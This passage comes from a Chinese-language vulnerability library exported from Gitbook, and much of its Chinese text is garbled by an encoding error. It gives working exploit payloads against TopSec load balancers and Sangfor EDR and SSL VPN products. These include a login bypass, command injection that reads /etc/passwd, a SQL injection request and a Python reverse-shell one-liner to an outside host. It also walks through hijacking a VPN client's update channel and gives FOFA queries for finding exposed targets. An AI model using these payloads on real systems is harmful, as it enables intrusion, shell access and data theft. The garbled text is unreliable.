Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Referer: http://36.99.45.142:9090/fileDownload?action=downloadBackupFile Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 fullPath=%2Fetc%2Fpasswd Goby & POC Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/‰∏≠ÂàõËßÜËøÖ/‰ºöÊç∑ÈÄö‰∫ëËßÜËÆØ ÁôªÂΩïÁªïËøáÊºèÊ¥û.html":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/‰∏≠ÂàõËßÜËøÖ/‰ºöÊç∑ÈÄö‰∫ëËßÜËÆØ ÁôªÂΩïÁªïËøáÊºèÊ¥û.html","title":"‰ºöÊç∑ÈÄö‰∫ëËßÜËÆØ ÁôªÂΩïÁªïËøáÊºèÊ¥û","keywords":"","body":"‰ºöÊç∑ÈÄö‰∫ëËßÜËÆØ ÁôªÂΩïÁªïËøáÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ ‰ºöÊç∑ÈÄö‰∫ëËßÜËÆØÂ≠òÂú®ÁôªÈôÜÁªïËøáÊºèÊ¥ûÔºåÈÄöËøáÊã¶Êà™ÁâπÂÆöÁöÑËØ∑Ê±ÇÂåÖÂπ∂‰øÆÊîπÂç≥ÂèØËé∑ÂèñÂêéÂè∞ÊùÉÈôê ÊºèÊ¥ûÂΩ±Âìç [!NOTE] ‰ºöÊç∑ÈÄö‰∫ëËßÜËÆØ FOFA [!NOTE] body=\"/him/api/rest/v1.0/node/role\" ÊºèÊ¥ûÂ§çÁé∞ ÁôªÈôÜÈ°µÈù¢Â¶Ç‰∏ã ËæìÂÖ•‰ªªÊÑèË¥¶Âè∑ÂØÜÁ†ÅÊäìÂåÖ ‰øÆÊîπËøîÂõûÂåÖ‰∏∫Â¶Ç‰∏ãÂêéÊîæÂåÖÂàôÊàêÂäüÁªïËøáÁôªÂΩï HTTP/1.1 200 Server: Hsengine/1.4.1 Date: Mon, 17 May 2021 16:13:43 GMT Content-Type: application/json;charset=UTF-8 Connection: close X-Frame-Options: SAMEORIGIN X-Content-Type-Options: nosniff X-XSS-Protection: 1; mode=block Accept-Ranges: bytes Vary: Accept-Charset, Accept-Encoding, Accept-Language, Accept Content-Length: 61 {\"token\":null,\"result\":null} Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/Â§©Ëûç‰ø°/":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/Â§©Ëûç‰ø°/","title":"Â§©Ëûç‰ø°","keywords":"","body":"Â§©Ëûç‰ø° Â§©Ëûç‰ø°Ë¥üËΩΩÂùáË°°TopApp-LB ‰ªªÊÑèÁôªÈôÜ Â§©Ëûç‰ø°Ë¥üËΩΩÂùáË°°TopApp-LB ÂëΩ‰ª§ÊâßË°åÊºèÊ¥û Â§©Ëûç‰ø°Ë¥üËΩΩÂùáË°°TopApp-LB SqlÊ≥®ÂÖ•ÊºèÊ¥û Â§©Ëûç‰ø°Ë¥üËΩΩÂùáË°°TopApp-LB enable_tool_debug.php ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û Â§©Ëûç‰ø°LDPÊú™ÊéàÊùÉËÆøÈóÆÊºèÊ¥û Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/Â§©Ëûç‰ø°/Â§©Ëûç‰ø°Ë¥üËΩΩÂùáË°°TopApp-LB‰ªªÊÑèÁôªÈôÜ.html":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/Â§©Ëûç‰ø°/Â§©Ëûç‰ø°Ë¥üËΩΩÂùáË°°TopApp-LB‰ªªÊÑèÁôªÈôÜ.html","title":"Â§©Ëûç‰ø°Ë¥üËΩΩÂùáË°°TopApp-LB‰ªªÊÑèÁôªÈôÜ","keywords":"","body":"Â§©Ëûç‰ø°Ë¥üËΩΩÂùáË°°TopApp-LB‰ªªÊÑèÁôªÈôÜ ÊºèÊ¥ûÊèèËø∞ Â§©Ëûç‰ø°Ë¥üËΩΩÂùáË°°TopApp-LBÁ≥ªÁªüÊó†ÈúÄÂØÜÁ†ÅÂèØÁõ¥Êé•ÁôªÈôÜÔºåÊü•ÁúãÊïèÊÑü‰ø°ÊÅØ ÂΩ±ÂìçÁâàÊú¨ Â§©Ëûç‰ø°Ë¥üËΩΩÂùáË°°TopApp-LB FOFA [!NOTE] app=\"Â§©Ëûç‰ø°-TopApp-LB-Ë¥üËΩΩÂùáË°°Á≥ªÁªü\" ÊºèÊ¥ûÂ§çÁé∞ Âú®ÁôªÂΩïÈ°µÈù¢‰∏≠ËæìÂÖ•ÔºåË¥¶Âè∑:‰ªªÊÑèË¥¶Âè∑ ÂØÜÁ†Å:;id ÊàêÂäüÁôªÂΩï Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/Â§©Ëûç‰ø°/Â§©Ëûç‰ø°Ë¥üËΩΩÂùáË°°TopApp-LB enable_tool_debug.php ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û.html":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/Â§©Ëûç‰ø°/Â§©Ëûç‰ø°Ë¥üËΩΩÂùáË°°TopApp-LB enable_tool_debug.php ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û.html","title":"Â§©Ëûç‰ø°Ë¥üËΩΩÂùáË°°TopApp-LB enable_tool_debug.php ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û","keywords":"","body":"Â§©Ëûç‰ø°Ë¥üËΩΩÂùáË°°TopApp-LB enable_tool_debug.php ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ Â§©Ëûç‰ø° TopSec-LB enable_tool_debug.phpÊñá‰ª∂Â≠òÂú® ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥ûÔºåÈÄöËøáÂëΩ‰ª§ÊãºÊé•ÊîªÂáªËÄÖÂèØ‰ª•ÊâßË°å‰ªªÊÑèÂëΩ‰ª§ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] Â§©Ëûç‰ø° TopSec-LB FOFA [!NOTE] app=\"Â§©Ëûç‰ø°-TopApp-LB-Ë¥üËΩΩÂùáË°°Á≥ªÁªü\" ÊºèÊ¥ûÂ§çÁé∞ ÁôªÂΩïÈ°µÈù¢Â¶Ç‰∏ã ÊºèÊ¥ûÊñá‰ª∂‰∏∫ enable_tool_debug.php commandWrapper.inc Êñá‰ª∂‰∏≠ÁöÑ runTool function runTool($val,$tool,$par){ if($val==\"0\"){ UciUtil::setValue('system', 'runtool', 'tool', $tool); UciUtil::setValue('system', 'runtool', 'parameter', $par); UciUtil::commit('system'); if($tool==\"1\"){ exec('ping '.$par.'>/tmp/tool_result &'); }else if($tool==\"2\"){ exec('traceroute '.$par.'>/tmp/tool_result &'); } }else if($val==\"1\"){ $tool=UciUtil::getValue('system', 'runtool', 'tool'); if($tool==\"1\"){ exec('killall ping '); }else if($tool==\"2\"){ exec('killall traceroute '); } UciUtil::setValue('system', 'runtool', 'tool', ''); UciUtil::setValue('system', 'runtool', 'parameter', ''); UciUtil::commit('system'); exec('echo \"\">/tmp/tool_result'); } } ËøôÈáåËÆæÁΩÆ var=0Ôºåtool=1ÔºåÂÜçËøõË°åÂëΩ‰ª§ÊãºÊé•ÈÄ†ÊàêËøúÁ®ãÂëΩ‰ª§ÊâßË°å /acc/tools/enable_tool_debug.php?val=0&tool=1&par=127.0.0.1' | cat /etc/passwd > ../../test.txt |' Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/Â§©Ëûç‰ø°/Â§©Ëûç‰ø°Ë¥üËΩΩÂùáË°°TopApp-LBÂëΩ‰ª§ÊâßË°åÊºèÊ¥û.html":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/Â§©Ëûç‰ø°/Â§©Ëûç‰ø°Ë¥üËΩΩÂùáË°°TopApp-LBÂëΩ‰ª§ÊâßË°åÊºèÊ¥û.html","title":"Â§©Ëûç‰ø°Ë¥üËΩΩÂùáË°°TopApp-LBÂëΩ‰ª§ÊâßË°åÊºèÊ¥û","keywords":"","body":"Â§©Ëûç‰ø°Ë¥üËΩΩÂùáË°°TopApp-LBÂëΩ‰ª§ÊâßË°åÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ Â§©Ëûç‰ø°Ë¥üËΩΩÂùáË°°TopApp-LBÁ≥ªÁªüÂ≠òÂú®‰ªªÊÑèÂëΩ‰ª§ÊâßË°å ÂΩ±ÂìçÁâàÊú¨ Â§©Ëûç‰ø°Ë¥üËΩΩÂùáË°°TopApp-LB FOFA [!NOTE] app=\"Â§©Ëûç‰ø°-TopApp-LB-Ë¥üËΩΩÂùáË°°Á≥ªÁªü\" ÊºèÊ¥ûÂ§çÁé∞ ÁôªÂΩïÁïåÈù¢‰∏≠Â≠òÂú®ÂëΩ‰ª§ÊâßË°å Ë¥¶Âè∑:1;ping 6km5dk.ceye.io;echo ÂØÜÁ†Å:‰ªªÊÑè ÊàêÂäüÊî∂Âà∞ËØ∑Ê±Ç Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/Â§©Ëûç‰ø°/Â§©Ëûç‰ø°Ë¥üËΩΩÂùáË°°TopApp-LB SqlÊ≥®ÂÖ•ÊºèÊ¥û.html":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/Â§©Ëûç‰ø°/Â§©Ëûç‰ø°Ë¥üËΩΩÂùáË°°TopApp-LB SqlÊ≥®ÂÖ•ÊºèÊ¥û.html","title":"Â§©Ëûç‰ø°Ë¥üËΩΩÂùáË°°TopApp-LB SqlÊ≥®ÂÖ•ÊºèÊ¥û","keywords":"","body":"Â§©Ëûç‰ø°Ë¥üËΩΩÂùáË°°TopApp-LB SqlÊ≥®ÂÖ•ÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ Â§©Ëûç‰ø°Ë¥üËΩΩÂùáË°° TopAPP-LB‰∫ßÂìÅÊóßÁâàÊú¨Âú®ÁÆ°ÁêÜÈù¢Â≠òÂú®SQLÊ≥®ÂÖ•ÊºèÊ¥ûÔºåÂÖ∑‰Ωì‰∏∫Âú®ÂèØ‰ª•ËÆøÈóÆÁÆ°ÁêÜÊúçÂä°ÊÉÖÂÜµ ‰∏ãÔºåÊîªÂáªËÄÖÈÄöËøáÊûÑÈÄ†ÊÅ∂ÊÑèËØ∑Ê±ÇÔºåÂà©Áî®Á≥ªÁªüÊ£ÄÊü•ËæìÂÖ•Êù°‰ª∂‰∏ç‰∏•Ê†ºÁöÑÁº∫Èô∑ÔºåËøõ‰∏ÄÊ≠•ÂèØËé∑ÂèñÈÉ®ÂàÜÁ≥ªÁªüÊú¨Âú∞‰ø°ÊÅØ ÂΩ±ÂìçÁâàÊú¨ Â§©Ëûç‰ø°Ë¥üËΩΩÂùáË°°TopApp-LB FOFA [!NOTE] app=\"Â§©Ëûç‰ø°-TopApp-LB-Ë¥üËΩΩÂùáË°°Á≥ªÁªü\" ÊºèÊ¥ûÂ§çÁé∞ Âà©Áî® Â§©Ëûç‰ø°Ë¥üËΩΩÂùáË°°TopApp-LB ‰ªªÊÑèÁôªÈôÜ ‰ΩøÁî®ÂêéÂè∞ Êèê‰∫§‰ª•‰∏ãÊï∞ÊçÆÂåÖ POST /acc/clsf/report/datasource.php HTTP/1.1 Host: Connection: close Accept: text/javascript, text/html, application/xml, text/xml, */* X-Prototype-Version: 1.6.0.3 X-Requested-With: XMLHttpRequest User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36 Sec-Fetch-Site: same-origin Sec-Fetch-Mode: cors Sec-Fetch-Dest: empty Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: PHPSESSID=ijqtopbcbmu8d70o5t3kmvgt57 Content-Type: application/x-www-form-urlencoded Content-Length: 201 t=l&e=0&s=t&l=1&vid=2147483647 or 1=1&gid=0&lmt=10&o=r_Speed&asc=false&p=8&lipf=&lipt=&ripf=&ript=&dscp=&proto=&lpf=&lpt=&rpf=&rpt=@„ÄÇ„ÄÇ Â≠òÂú®SQLÁõ≤Ê≥® Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/Â§©Ëûç‰ø°/Â§©Ëûç‰ø°LDPÊú™ÊéàÊùÉËÆøÈóÆÊºèÊ¥û.html":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/Â§©Ëûç‰ø°/Â§©Ëûç‰ø°LDPÊú™ÊéàÊùÉËÆøÈóÆÊºèÊ¥û.html","title":"Â§©Ëûç‰ø°LDPÊú™ÊéàÊùÉËÆøÈóÆÊºèÊ¥û","keywords":"","body":"Â§©Ëûç‰ø°LDPÊú™ÊéàÊùÉËÆøÈóÆÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ Â§©Ëûç‰ø°LDPÂ≠òÂú®Êú™ÊéàÊùÉËÆøÈóÆÊºèÊ¥û ÊºèÊ¥ûÂΩ±Âìç [!NOTE] Â§©Ëûç‰ø°LDP ÊºèÊ¥ûÂ§çÁé∞ POC‰∏∫ ÈªòËÆ§Áî®Êà∑supermanÁöÑuid=1 POST /?module-auth_user&action=mod_edit.pwd HTTP/1.1 Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/Ê∑±‰ø°Êúç/":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/Ê∑±‰ø°Êúç/","title":"Ê∑±‰ø°Êúç","keywords":"","body":"Ê∑±‰ø°Êúç Ê∑±‰ø°ÊúçEDRËøúÁ®ãÂëΩ‰ª§ÊâßË°å CNVD-2020-46552 Ê∑±‰ø°ÊúçÂêéÂè∞‰ªªÊÑèÁî®Êà∑ÁôªÈôÜÊºèÊ¥û Ê∑±‰ø°Êúç SSL VPN ÂÆ¢Êà∑Á´ØËøúÁ®ãÊñá‰ª∂‰∏ãËΩΩ Ê∑±‰ø°Êúç Ë°å‰∏∫ÊÑüÁü•Á≥ªÁªü c.php ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û Ê∑±‰ø°Êúç Êó•Âøó‰∏≠ÂøÉ c.php ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/Ê∑±‰ø°Êúç/Ê∑±‰ø°ÊúçEDRËøúÁ®ãÂëΩ‰ª§ÊâßË°å CNVD-2020-46552.html":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/Ê∑±‰ø°Êúç/Ê∑±‰ø°ÊúçEDRËøúÁ®ãÂëΩ‰ª§ÊâßË°å CNVD-2020-46552.html","title":"Ê∑±‰ø°ÊúçEDRËøúÁ®ãÂëΩ‰ª§ÊâßË°å CNVD-2020-46552","keywords":"","body":"Ê∑±‰ø°ÊúçEDRËøúÁ®ãÂëΩ‰ª§ÊâßË°å CNVD-2020-46552 ÊºèÊ¥ûÊèèËø∞ Ê∑±‰ø°ÊúçÁªàÁ´ØÊ£ÄÊµãÂìçÂ∫îÂπ≥Âè∞ÊòØÊ∑±‰ø°ÊúçÂÖ¨Âè∏ÂºÄÂèëÁöÑ‰∏ÄÂ•óEDRÁ≥ªÁªü„ÄÇÊîªÂáªËÄÖÂà©Áî®ËØ•ÊºèÊ¥ûÔºåÂèØÂêëÁõÆÊ†áÊúçÂä°Âô®ÂèëÈÄÅÊÅ∂ÊÑèÊûÑÈÄ†ÁöÑHTTPËØ∑Ê±ÇÔºå‰ªéËÄåËé∑ÂæóÁõÆÊ†áÊúçÂä°Âô®ÁöÑÊùÉÈôêÔºåÂÆûÁé∞ËøúÁ®ã‰ª£Á†ÅÊéßÂà∂ÊâßË°å„ÄÇ ÂΩ±ÂìçÁâàÊú¨ [!NOTE] EDR v3.2.16 EDR v3.2.17 EDR v3.2.19 ÊºèÊ¥ûÂ§çÁé∞ https://xxx.xxx.xxx.xxx/tool/log/c.php?strip_slashes=system&limit=whoami https://xxx.xxx.xxx.xxx/tool/log/c.php?strip_slashes=system&host=whoami https://xxx.xxx.xxx.xxx/tool/log/c.php?strip_slashes=system&path=whoami https://xxx.xxx.xxx.xxx/tool/log/c.php?strip_slashes=system&row=whoami ÂèçÂºπshell POST /tool/log/c.php HTTP/1.1 Host: x.x.x.x Upgrade-Insecure-Requests: 1 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8 Content-Type: application/x-www-form-urlencoded;charset=utf-8 Accept-Language: zh-CN,zh;q=0.9 Content-Length: 256 strip_slashes=system&host=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"xxx.xxx.xxx.xxx\",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' Âêë /tool/log/c.php POST‰ª•‰∏ãÊï∞ÊçÆÂç≥ÂèØ strip_slashes=system&host=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"xxx.xxx.xxx.xxx\",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/Ê∑±‰ø°Êúç/Ê∑±‰ø°Êúç SSL VPN ÂÆ¢Êà∑Á´ØËøúÁ®ãÊñá‰ª∂‰∏ãËΩΩ.html":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/Ê∑±‰ø°Êúç/Ê∑±‰ø°Êúç SSL VPN ÂÆ¢Êà∑Á´ØËøúÁ®ãÊñá‰ª∂‰∏ãËΩΩ.html","title":"Ê∑±‰ø°Êúç SSL VPN ÂÆ¢Êà∑Á´ØËøúÁ®ãÊñá‰ª∂‰∏ãËΩΩ","keywords":"","body":"Ê∑±‰ø°Êúç SSL VPN ÂÆ¢Êà∑Á´ØËøúÁ®ãÊñá‰ª∂‰∏ãËΩΩ ÊºèÊ¥ûÊèèËø∞ Ê∑±‰ø°Êúç SSL VPN ÂÆ¢Êà∑Á´ØÂ≠òÂú®ËøúÁ®ãÊñá‰ª∂‰∏ãËΩΩÔºå‰∏îÊñá‰ª∂ÂèØÊéß‰∏ãËΩΩÂêéÂèØÊâßË°å ÊºèÊ¥ûÂΩ±Âìç [!NOTE] Ê∑±‰ø°Êúç SSL VPN ÊºèÊ¥ûÂ§çÁé∞ ÁôæÂ∫¶\"intitle: Ê¨¢Ëøé‰ΩøÁî®SSL VPN\"ÔºåÈöè‰æøÊâæ‰∏Ä‰∏™Âú∞Êñπ‰∏ãËΩΩVPNÂÆ¢Êà∑Á´Ø‰∏ãËΩΩÂÆâË£ÖÔºö ÂÆâË£ÖÂÆå‰πãÂêéËÆøÈóÆVPNÁöÑÈ°µÈù¢ÔºåÂèëÁé∞VPN‰ºöËá™Âä®‰∏ãËΩΩÁªÑ‰ª∂Êõ¥Êñ∞Ôºö Ëøô‰∫õËØ∑Ê±ÇÂùá‰∏∫GETËØ∑Ê±ÇÂπ∂ÈôÑÂ∏¶ÁùÄ‰∏Ä‰∫õÂèÇÊï∞ÔºåÊàë‰ª¨ÊääÂÆÉ‰∏Ä‰∏ÄÂàó‰∏ãÊù•Ôºö Êú¨Âú∞Êù•Áúã‰∏Ä‰∏ãËøô‰∏™54530Á´ØÂè£ÂØπÂ∫îÁöÑËøõÁ®ãÊòØ‰ªÄ‰πàÔºö ÂèëÁé∞Ëøô‰∏™Á´ØÂè£ÊòØECAgent.exeÂºÄÂêØÁöÑÔºåÂØªÊâæÂà∞ÂØπÂ∫îËøõÁ®ãÊñá‰ª∂ÊâÄÂú®‰ΩçÁΩÆÔºö Á°ÆËÆ§ËøôÊòØXXX SSLVPNÁöÑÁ®ãÂ∫èÔºåÈÇ£‰πàÂ∞±ÂèØ‰ª•Â∞Ü‰∏§ËÄÖËÅîÁ≥ªÂà∞‰∏ÄËµ∑ÔºåËÆøÈóÆVPNÁôªÂΩïÈ¶ñÈ°µ‰ºöËß¶ÂèëÂØπ127.0.0.1ÁöÑËÆøÈóÆ‰ªéËÄåÂºïËµ∑VPNËøõË°åÁªÑ‰ª∂Êõ¥Êñ∞„ÄÇ ÈÄöËøá‰ª•‰∏äÁöÑÂàÜÊûêÊàë‰ª¨ÁåúÊµã‰∫ÜÊï¥‰∏™Â§ßËá¥ÊµÅÁ®ãÔºå‰ΩÜÊàë‰ª¨ËÆæÊÉ≥‰∏Ä‰∏ãÂ¶ÇÊûúÊàë‰ª¨ÂèØ‰ª•ÊéßÂà∂Êú¨Âú∞ÁöÑÊõ¥Êñ∞ÊåáÂêëÊàë‰ª¨ÁöÑÊúçÂä°Âô®ÔºåÁÑ∂ÂêéÂ∞ÜÊõ¥Êñ∞ÁöÑÁªÑ‰ª∂ÂÜÖÂÆπÊõøÊç¢ÊàêÊÅ∂ÊÑèÁ®ãÂ∫èÔºåÂΩìÁ®ãÂ∫èÂêØÂä®ÁöÑÊó∂ÂÄôÂ∞±ÂêØÂä®‰∫ÜÊÅ∂ÊÑèÁ®ãÂ∫èÔºåËøôÊ†∑Êàë‰ª¨ÂèØ‰ª•ÊãøÂà∞ÂÆâË£ÖVPNÂÆ¢Êà∑Á´ØÁöÑ‰ΩøÁî®ËÄÖPCÊùÉÈôê„ÄÇ ÂÜçÂõûÂà∞‰πãÂâçÁöÑÊú¨Âú∞ÈìæÊé•ÂàóË°®ÔºåÊ†πÊçÆÂØπËã±ÊñáÁöÑÁêÜËß£ÔºåÂèÇÊï∞opÁöÑÂÄºÂ∫îËØ•‰∏∫ÂÖ∂ÂÖ∑‰ΩìÂØπÂ∫îË¶ÅÊâßË°åÁöÑÂä®‰ΩúÔºö InitECAgent -> ÂàùÂßãÂåñ GetEncryptKey -> Ëé∑ÂèñÂä†ÂØÜÂØÜÈí• DoConfigure -> ÈÖçÁΩÆ CheckReLogin -> Ê£ÄÊü•ÈáçÊñ∞ÁôªÂΩï CheckProxySetting -> Ê£ÄÊü•‰ª£ÁêÜËÆæÁΩÆ UpdateControls -> Êõ¥Êñ∞ÊéßÂà∂ DoQueryService -> Êü•ËØ¢ÊúçÂä° Á¨¨‰∏Ä‰∏™ÂàùÂßãÂåñÁöÑËØ∑Ê±ÇÂ≠òÂú®ÂèØÊéßÂèÇÊï∞arg1Ôºö https://127.0.0.1:54530/ECAgent/?op=InitECAgent&arg1=vpn.xxx.edu.cn%20443&callback=EA_cb10000 ÂèÇÊï∞arg1=vpn.xxx.edu.cn%20443ÔºåÂØπÂ∫îÂÄº‰πüÂ∞±ÊòØHOST+Á©∫Ê†º+Á´ØÂè£ÁöÑÊ†ºÂºèÔºåÁúãÂà∞ËøôÈáåÂü∫Êú¨‰∏äÂ∞±‰ºöÊúâ‰∏Ä‰∏™ÊÄùË∑ØÔºåÂÆ¢Êà∑Á´ØÊõ¥Êñ∞Êéß‰ª∂ÊòØ‰∏çÊòØÊ†πÊçÆËøô‰∏™ÊåáÂÆöÂÄºÂêëÂÖ∂ÂèëÈÄÅËØ∑Ê±ÇÊõ¥Êñ∞ÁöÑÂë¢ÔºüÊàë‰ª¨ÂèØ‰ª•Âè™ÊõøÊç¢Á¨¨‰∏Ä‰∏™ÂàùÂßãÂåñËØ∑Ê±ÇÁöÑarg1ÂèÇÊï∞‰∏∫172.20.10.2 8000ÔºåÁÑ∂ÂêéÊú¨Âú∞Êê≠Âª∫‰∏Ä‰∏™HTTPÊúçÂä°Ôºö python -m SimpleHTTPServer ÂÖ∂‰ªñÁöÑËØ∑Ê±ÇÂéüÂ∞Å‰∏çÂä®Ôºå‰æùÊ¨°ËØ∑Ê±Ç‰∏ÄÈÅçÈÇ£‰∏Ä‰ªΩURL ÊúçÂä°Á´ØÊàêÂäüÊî∂Âà∞ËØ∑Ê±ÇÔºå‰ΩÜÊòØÂç¥Âá∫Áé∞‰∫ÜÈîôËØØÁöÑÊèêÁ§∫Ôºö È¶ñÂÖàÊàë‰ª¨Â∑≤ÁªèÈ™åËØÅ‰∫ÜËá™Â∑±ÁöÑÁåúÊÉ≥ÔºåÊõ¥Êñ∞Âú∞ÂùÄÊòØËá™Â∑±ÂèØÊéßÁöÑÔºåÂÆ¢Êà∑Á´ØÁ°ÆÂÆû‰ºöÂêëÊàë‰ª¨ÊåáÂÆöÁöÑÊúçÂä°Á´ØÂèëÈÄÅËØ∑Ê±ÇÔºå‰ΩÜÁî±‰∫éÂá∫Áé∞‰∫ÜÈîôËØØÊàë‰ª¨‰∏çÁü•ÈÅìÂÆ¢Êà∑Á´ØËÆøÈóÆ‰∫ÜÂì™‰∏™Êñá‰ª∂Ôºå‰πü‰∏çÁü•ÈÅìËÆøÈóÆÊñá‰ª∂‰πãÂêéÂÅö‰∫Ü‰ªÄ‰πàÂä®‰Ωú„ÄÇ Áé∞Âú®Ë¶ÅÂÅöÁöÑÂ∞±ÊòØÊê≠Âª∫‰∏Ä‰∏™ÂÆ¢Êà∑Á´ØÂèØ‰ª•Ê≠£Â∏∏ËÆøÈóÆÁöÑËØ∑Ê±ÇÔºåÈÄöËøáËøô‰∏™ÈîôËØØÂ§ßËá¥ÂèØ‰ª•Áü•ÈÅìÔºåÊàëÊê≠Âª∫ÁöÑÊúçÂä°Á´ØÂçèËÆÆÂíåÂÆ¢Êà∑Á´ØËØ∑Ê±Ç‰ΩøÁî®ÁöÑÂçèËÆÆ‰∏ç‰∏ÄËá¥ÔºåÊú¨Êú∫Êäì‰∏™ÂåÖÂèëÁé∞ÂÆ¢Êà∑Á´ØËØ∑Ê±ÇÁöÑÊòØ HTTPS ÂçèËÆÆÔºåËøôÂ∞±ÈúÄË¶ÅÊê≠Âª∫‰∏Ä‰∏™ HTTPS ÊúçÂä°‰∫Ü„ÄÇ Â¶Ç‰∏ãËÑöÊú¨Âü∫‰∫éPythonÂ∫ìÂª∫Á´ã‰∏Ä‰∏™ HTTPS ÊúçÂä°Ôºö # openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes import BaseHTTPServer, SimpleHTTPServer import ssl httpd = BaseHTTPServer.HTTPServer(('0.0.0.0', 8000), SimpleHTTPServer.SimpleHTTPRequestHandler) httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True) httpd.serve_forever() Êê≠Âª∫Ëµ∑‰∏Ä‰∏™ HTTPS ÁéØÂ¢ÉÂêéÂÜçÊ¨°Â§çÁé∞Â¶Ç‰∏äËØ∑Ê±ÇÔºåÊúçÂä°Á´ØÊî∂Âà∞Êó•ÂøóÔºö ÂèØ‰ª•ÁúãËßÅÂÆ¢Êà∑Á´Ø‰ºöËÆøÈóÆ‰∏§‰∏™Êñá‰ª∂Ôºö /com/WindowsModule.xml /com/win/XXXUD.exe 